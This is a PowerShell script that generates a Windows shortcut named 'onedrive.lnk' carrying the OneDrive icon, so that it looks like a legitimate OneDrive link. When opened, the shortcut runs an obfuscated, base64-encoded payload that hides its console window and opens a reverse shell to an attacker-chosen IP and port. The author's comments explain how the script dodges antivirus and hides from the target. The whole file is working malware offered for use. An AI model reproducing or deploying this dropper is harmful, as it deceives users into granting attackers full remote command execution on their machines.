param([string]$ip,[string]$port)

#optionally you may have to remove line 7 to avoid AV flagging, but it isn't being flagged at the moment.
#if you do remove line 7 you can just paste it in or have it auto run on the attacker box to hide the window also
#hide window line 7, reverse shell line 8
$code=@'
Add-Type -name y -names x -m '[DllImport("kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr a, Int32 b);';[x.y]::ShowWindow([x.y]::GetConsoleWindow(), 0)
$x=(New-Object net.sock''ets.tcpc''lient("~",^)).('gets'+'tream')();[byte[]]$b=0..65535|%{0};while(($i=$x.('rea'+'d')($b,0,$b.Length))-ne 0){$d=([text.encoding]::getencoding(20127)).('getb'+'ytes')(((i''ex((New-Object -t text.('asciie'+'ncoding')).('gets'+'tring')($b,0,$i))2>&1|out-string)+(pwd).path+"> "));$x.write($d,0,$d.Length);$x.flush()}
'@ -replace '~',$ip -replace '\^',$port

#convert code to base64
$b64 = [Convert]::ToBase64String(([System.Text.Encoding]::ascii.GetBytes($code)))

#making the lnk file
$WshShell = New-Object -comObject WScript.Shell

#I guess you could change the output folder if you want
$Shortcut = $WshShell.CreateShortcut("C:\Users\"+$env:USERNAME+"\Desktop\onedrive.lnk")
$Shortcut.RelativePath =  "powershell"

#edit here if you want a different icon, no it doesn't save the icon to it so i'd pick a popular path one target will have
$Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
$Shortcut.TargetPath = "powershell"

#fist bit is to decode the base64 then execute it, avoids using -encodedCommand switch which gets flagged a lot
$Shortcut.Arguments = ("[text.encoding]::([char[]](97,83,99,105,73)-join'').([char[]](103,69,84,115,116,82,73,110,103)-join'')([convert]::([char[]](102,82,111,77,98,65,115,69,54,52,115,84,114,73,78,103)-join'')('"+$b64+"'))|powe''rshell")

#start powershell minimized and it should disappear in like a second so good luck
$Shortcut.WindowStyle = 7
$Shortcut.Save()
